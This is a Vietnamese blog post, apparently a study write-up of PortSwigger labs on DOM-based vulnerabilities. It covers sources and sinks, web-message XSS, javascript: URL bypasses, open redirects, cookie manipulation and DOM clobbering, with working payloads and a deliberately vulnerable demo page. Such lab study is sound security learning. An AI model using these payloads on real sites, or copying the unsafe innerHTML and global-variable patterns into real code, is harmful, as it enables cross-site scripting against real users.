---
title: Vulnerabilities in DOM
published: 2025-07-18
tags: [Portswigger, Pentest]
category: 'Learning'
draft: false 
image: "/assets/post_image/dom.png"
---

# Research: Dom-based Vulnerabilities
## I.Dom là gì
![image](https://hackmd.io/_uploads/HkodQ-4Ige.png)
`DOM (Document Object Model)` là mô hình dạng cây (tree) đại diện cho cấu trúc của một tài liệu HTML hoặc XML.
Hãy tưởng tượng, khi ta host một trang web HTMl và deploy nó lên, sao đó truy cập bằng browser. Thì trang web đó sẽ được trình duyệt phân tichs thành một `DOM` bao gồm phân cấp là `Root element > Element > Attribute > Text` từ đó ta có một mô hình phân cấp cho toàn bộ web.
Tác dụng của `DOM` là phân cấp trang web và giúp cho javascript có thể dễ dàng truy cập và thay đổi nội dung của trang web
## II. Taint Flow Vulnerabilities
Trước tiên để khai thác lỗ hỏng ta cần phải làm quen với khái niệm `source` và `sink` 
### 1. Source 
`Source` là một thuộc tính `JavaScript`chấp nhận dữ liệu có khả năng do kẻ tấn công kiểm soát. Một ví dụ về nguồn là thuộc tính `location.search` vì nó đọc đầu vào từ chuỗi truy vấn, tương đối đơn giản để kẻ tấn công kiểm soát. Cuối cùng, bất kỳ những gì có thể được kiểm soát bởi kẻ tấn công đều là một nguồn tiềm năng. Điều này bao gồm `URL` (được hiển thị bởi chuỗi `document.referrer`) hay là cookie của người dùng (được hiển thị bởi chuỗi `document.cookie`) và thông báo web.

```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

## 2. Sink
Sink là một hàm `Javascript` hoặc đối tượng `DOM` dùng để nhận dữ liệu từ `source` và xử lý dữ liệu đó, nó có khả năng nguy hiểm có thể gây ra các ảnh hưởng không mong muốn nếu dữ liệu do kẻ tấn công kiểm soát được chuyển đến nó. Ví dụ: hàm `eval()` là một sink vì nó xử lý đối số được truyền cho nó dưới dạng `JavaScript`. Một ví dụ về sink `HTML` là `document.body.innerHTML` vì nó có khả năng cho phép kẻ tấn công chèn HTML độc hại và thực thi `JavaScript` tùy ý.

```
document.write()
window.location
document.cookie
eval()
document.domain
WebSocket()
element.src
postMessage()
etRequestHeader()
FileReader.readAsText()
xecuteSql()
sessionStorage.setItem()
Cdocument.evaluate()
SON.parse()
element.setAttribute()
egExp()

```


```html 

<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Ví dụ Source và Sink</title>
</head>
<body>

    <label for="dataSource">Nhập dữ liệu vào đây (Source):</label>
    <input type="text" id="dataSource" onkeyup="processData()">

    <hr>

    <p><strong>Dữ liệu sẽ hiển thị ở đây (Sink):</strong> <span id="dataSink"></span></p>

    <script>
        function processData() {
            // 1. Lấy dữ liệu từ SOURCE (ô input)
            const source = document.getElementById('dataSource');
            const data = source.value;

            // 2. Đưa dữ liệu đã xử lý vào SINK (thẻ span)
            const sink = document.getElementById('dataSink');
            sink.innerHTMl = data; // Hiển thị dữ liệu
        }
    </script>

</body>
</html>
```
Đây là một mã đơn giản về luồng xử lý data của `source` và `sink`. Ta thấy khi tâ nhập dữ liệu vào thẻ `input` có id là `dataSource`. Sau đó ở hàm `processData()` sẽ lấy id từ thẻ `input` sau đó lấy dữ liệu của nó truyền vào biến `data`.
Tiếp theo là nhiệm vụ của `sink` dùng `datta` đó để in ra ngoài. Vấn đề sẽ xuất phát từ đây, khi `sink` lại in `data` ra một cách không kiểm soát, dẫn đến kẻ tấn công có thể chèn các lệnh `HTML` khác vào để trigger `XSS`

Ở đây có thể thấy, mình chỉ dùng một payload đơn giản đã có thể bật được `XSS` mà không hề có biện pháp ngăn chặn nào từ phía server
![image](https://hackmd.io/_uploads/SyC24QB8gx.png)

> Từ đây ta có thể hiểu được định nghĩa `source` và `sink` và nguyên nhân bắt nguồn dẫn đến các lỗ hỏng `DOM-Based`, giờ mình sẽ tiến hành thực hiện các Labs và cũng tìm hiểu sâu về các dạng của lỗ hỏng này

## III. Labs
### 1. DOM XSS using web messages
Web Messages là một API (giao diện lập trình ứng dụng) của trình duyệt cho phép các "ngữ cảnh duyệt web" khác nhau (như cửa sổ, tab, iframe, hoặc Web Worker) có thể gửi và nhận tin nhắn một cách an toàn.
Điểm mấu chốt và mạnh mẽ nhất của nó là cho phép giao tiếp ngay cả khi các trang web đến từ các nguồn khác nhau (khác domain, khác giao thức, hoặc khác cổng).

Ta sẽ tiến hành làm lab, và sau đó ta sẽ có thể hiểu rõ hơn về API này
![image](https://hackmd.io/_uploads/BJa7w7HIex.png)
Lab này của ta có vẻ như là một trang web tĩnh và không hề có input, chỉ có một dòng text khá lạ ở dây, viewsource thử xem thì có lẽ đây là nơi để nhận quảng cáo từ một nguồn khác để trỏ vào web vì id ở đây là `ads`
![image](https://hackmd.io/_uploads/S1SKP7r8xe.png)
Hãy cùng nhìn đoạn code js dùng để xử lý thì ta thấy có `addEvenLístener('message'functions(e))` đây là dấu hiệu rõ ràng nhất cho web này có thể tương tác bằng web messages. Tiếp đến ở bên dưới sau khi đã nhận dữ liệu thì tiếp tục lấy thẳng id `ads` và xuất nó ra ngoài bằng `innerHTMl` mà không hề filter, đây chính là lỗ hỏng có thể dẫn đến.
Ta biết rằng, web không hề có input ở trang chính mà thay vào đó ta có thể gửi message bằng `iframe`
```html 
<iframe src='https://0a9e00d10433454481efc509002d0012.web-security-academy.net/' onload="this.contentWindow.postMessage('<img src=# onerror=alert(1)','*')>
```
Ta có thể gửi messages đến cho lab, ta thấy message được xuất ra bằng innerHTML mà không filter -> ta có thể inject một payload xss cơ bản để trigger `XSS`

### 2.DOM XSS using web messages and a JavaScript URL
Ở lab này ta vẫn sẽ sử dụng web messages để khai thác, tuy nhiên phần js ở đây sẽ xử lý khác hơn chút
![image](https://hackmd.io/_uploads/BJxRnQB8xg.png)
Ta thấy rằng data của ta truyền vào sẽ được kiểm tra và check xem có `http:` hay `https:` không sau đó trang gốc sẽ được chuyển hưởng đến data mà ta cung cấp từ đây ta có payload như sau
```html 
<iframe src="https://0a900040032b231480814e7000120009.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

```
Ta sẽ dùng `Javascript URL`, là một URL đặc biệt khi truyền vào thì browser sẽ xử lý như một lệnh javascript, và bypass `http:` bằng cách `//http:` do điều kiện chỉ kiểm tra xem `http:` có trong data hay không nên ta sẽ truyền vào và comment nó lại là ta có thể bypass dễ dàng

### 3. DOM-based open redirection
Giờ ta sẽ tìm hiểu một lỗ hỏng khác dựa trên `DOM` đó chính là `open redirection`. Các lỗ hổng chuyển hướng mở dựa trên `DOM` phát sinh khi một tập lệnh ghi dữ liệu có thể kiểm soát của kẻ tấn công vào một `sink` có thể kích hoạt điều hướng giữa các `Origin`. Ví dụ: code sau đây dễ bị tấn công do cách nó xử lý thuộc tính `location.hash` không an toàn:
```javascript 
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```
Kẻ tấn công có thể sử dụng lỗ hổng này để tạo một URL, nếu người dùng khác truy cập, sẽ gây ra chuyển hướng đến một miền bên ngoài tùy ý.

Đến với lab, ta thấy lab có giao diện như một blog, và ta sẽ check request xem thử
![image](https://hackmd.io/_uploads/S19z9DBIxg.png)
Ta có thể thấy được một thẻ `a` giúp retrun về trang chủ. Đoạn code gây lỗ hổng `Open Redirect` vì nó lấy `URL` từ location rồi tự động chuyển hướng người dùng sang đó khi click. Do đó kẻ tấn công có thể gửi link như `https://example.com/?url=https://evil.com` để dụ người dùng click và bị chuyển hướng ra trang độc hại.

Do đó ta có thể khai thác theo yêu cầu của lab là chuyển hướng sang exploit server nên ta có payload 
```html 

https://0aea00fa04f642788002036f00d800d5.web-security-academy.net/post?postId=4&url=http://exploit-0a1e00f8045342f480f5022b01550095.exploit-server.net/

```

### 4. DOM-based cookie manipulation
`DOM-based cookie manipulation` là một loại lỗ hổng bảo mật web xảy ra khi một tập lệnh (script) ở phía trình duyệt (client-side) ghi dữ liệu mà kẻ tấn công có thể kiểm soát vào giá trị của một cookie. Điều đặc biệt nguy hiểm ở đây là lỗ hổng này tận dụng `DOM` (Document Object Model), tức là cách trình duyệt xây dựng và tương tác với cấu trúc của trang web.

```javascript 
document.cookie = 'cookieName='+location.hash.slice(1);
```
Ví dụ ở đoạn code dưới đây, ta có thể thấy `location.hash.slice(1)` lấy chuỗi sau dấu `#` trong URL của trang. Giá trị này sau đó được gán trực tiếp vào một cookie có tên là `cookieName` nhưng không hề validate nên dẫn đến việc nếu kẻ tấn công tạo một `URL` như `https://example.com/page.html#evil_value`, thì cookie `cookieName` sẽ được đặt thành `evil_value`. Điều này cho phép kẻ tấn công chèn bất kỳ giá trị tùy ý nào vào cookie của người dùng.

GIờ ta sẽ tiến hành thực hành với lab, ở đây ta thấy trang web có một cookie tên là `lastViewedProduct`dùng để lưu lại phần product ID cuối cùng mà user click vào xem. 
![image](https://hackmd.io/_uploads/SkgMXLhLUeg.png)
Tiến hành check code js thì ta thấy được đoạn mã gen cookie như sau 
![image](https://hackmd.io/_uploads/Hy5PL2IUlx.png)
Ta thấy đoạn code lấy giá trị của `window.location` tức là giá trị hiện tại của cửa sổ người dùng, đây chính là nguyên nhân chính gây ra lỗ hỏng. Thay vì lấy một phần cụ thể đã được làm sạch của `URL` (ví dụ: chỉ window.location.pathname hoặc window.location.hash sau khi đã kiểm tra an toàn), đoạn mã này lại sử dụng toàn bộ đối tượng `window.location`.
Khi nối một đối tượng `JavaScript` (như window.location) vào một chuỗi, `JavaScript` sẽ tự động chuyển đổi đối tượng đó thành chuỗi. Trong trường hợp của `window.location`, nó sẽ chuyển đổi thành toàn bộ `URL` hiện tại của trang.
Điều này có nghĩa là, nếu kẻ tấn công có thể chèn mã độc vào bất kỳ phần nào của `URL` mà `window.location` đại diện (ví dụ: thông qua query string ? hoặc hash #), thì mã độc đó sẽ được đưa thẳng vào giá trị của cookie `lastViewedProduct`.
![image](https://hackmd.io/_uploads/SkcX_3LIge.png)

Ta có thể nhìn thấy ở đây, sau khi mình nối thêm `&` vào URL thì hoàn toàn có thể inject được vào cookie, vậy sẽ như nào nếu ta inject một payload `XSS` vào? Mình sẽ inject `&'><script>print()</script>` vào và hoàn toàn có thể khai thác thành công
![image](https://hackmd.io/_uploads/r1yD9nIIex.png)

### 5. DOM CLobbering
Đây lại là một lỗ hỏng mới ta cần tìm hiểu, đây là lỗ hỏng mà cắc attacker có thể chèn mã `HTML` vào trang để có thể sửa đổi cấu trúc của một `DOM` từ đó ảnh hưởng đến js và có thể thay đổi hoặc làm hỏng đoạn code đó
Cơ bản `clobbering` có nghĩa là ta đang `đè lên` hoặc `ghi đè` một biến toàn cục (global variable) hoặc một thuộc tính của đối tượng `JavaScript` bằng cách thay thế nó bằng một nút `DOM (DOM node)` hoặc một tập hợp các phần tử `HTML (HTML collection)`.

Ví dụ ta có một đoạn vulnerable code như sau
```javascript 
<script>
    window.onload = function(){
        let someObject = window.someObject || {}; // (1)
        let script = document.createElement('script');
        script.src = someObject.url; // (2)
        document.body.appendChild(script); // (3)
    };
</script>
```

* someObject được khởi tạo.
* Một thẻ `<script>` mới được tạo, và thuộc tính `src` của nó được gán bằng giá trị của someObject.url.
* Thẻ `<script>` này sau đó được thêm vào `document.body`, khiến trình duyệt tải và thực thi tập lệnh từ `someObject.url`.

Attacker có thể khai thác code này như sau, chúng sẽ inject vào web một code như sau 
```html 
<a id=someObject>
<a id=someObject name=url href=//malicious-website.com/evil.js>
```
* `<a id=someObject>`: Khi trình duyệt xử lý thẻ `a` đầu tiên này, nó sẽ tự động tạo một biến toàn cục tên là `someObject` trỏ đến phần tử `a` này.
* `<a id=someObject name=url href=//malicious-website.com/evil.js>`: Thẻ `a` thứ hai cũng có `id=someObject`. Khi có nhiều phần tử có cùng id, `DOM` sẽ nhóm chúng lại thành một `HTML collection` 
* Do đó, biến toàn cục `someObject` (được tạo ở bước trước) giờ đây bị `clobbered` và trỏ đến `HTML collection` chứa cả hai thẻ `a` này.
* Thẻ `a` thứ hai này cũng có thuộc tính `name=url` và `href=//malicious-website.com/evil.js`.
    
Khi đoạn JavaScript ở trên thực thi:
* Tại dòng (1): `let someObject = window.someObject || {};`: Vì `window.someObject` đã bị ghi đè bởi `HTML collection` chứa hai thẻ `a`, biến someObject trong JavaScript giờ đây sẽ tham chiếu đến `HTML collection` đó.
* Tại dòng (2): `script.src = someObject.url;`: Khi JavaScript cố gắng truy cập `someObject.url`, nó không còn truy cập vào một đối tượng `JavaScript` thông thường nữa mà là một `HTML collection`. Trong `HTML collection` này, thẻ `a` thứ hai có `name="url"`. Khi truy cập `someObject.url`, trình duyệt sẽ tìm thuộc tính `url` trong `collection`, và nó sẽ trả về giá trị của thuộc tính href của thẻ `a` có `name="url"`, tức là `//malicious-website.com/evil.js`.
* Tại dòng (3): `document.body.appendChild(script);`: Trình duyệt sẽ tạo một thẻ `script` với `src` là `//malicious-website.com/evil.js` và thêm nó vào trang. Điều này khiến trình duyệt tải và thực thi tập lệnh độc hại từ `malicious-website.com`, dẫn đến tấn công `XSS` hoặc các hành vi độc hại khác. 
    
Đến với lab, ta có thể thấy ta có thể comment vào các bài post bằng `HTML`
![image](https://hackmd.io/_uploads/rkyq0avIel.png)
Check source ta có thể thấy, có một id để sử dụng cho avatar default là `defaultAvatar` và được link đến file `loadCommentsWithDomClobbering.js` 
![image](https://hackmd.io/_uploads/S1HEyCDUgl.png)
Vào bên trong để check thì ta thấy ngay một vulnerable code
![image](https://hackmd.io/_uploads/B15QJAwLgx.png)
* Sử dụng biến toàn cục (window.defaultAvatar): Đoạn mã này kiểm tra xem có một biến toàn cục `defaultAvatar` nào đó trên đối tượng window hay không. Nếu có, nó sẽ sử dụng giá trị đó; nếu không, nó sẽ khởi tạo một đối tượng mới với thuộc tính avatar mặc định.

Check tiếp trong phần js ta có thể thấy một file là `DomPurify.js`. Đây chính là file để detect `XSS`. Tuy nhiên, nó có một điểm yếu: nó cho phép sử dụng giao thức `cid: (Content-ID URI scheme, thường dùng trong email)`. Quan trọng hơn, `DOMPurify` không `URL encode` ký tự dấu nháy kép khi sử dụng giao thức `cid:`. Điều này có nghĩa là ta có thể chèn một chuỗi chứa dấu nháy kép không được mã hóa vào thuộc tính href.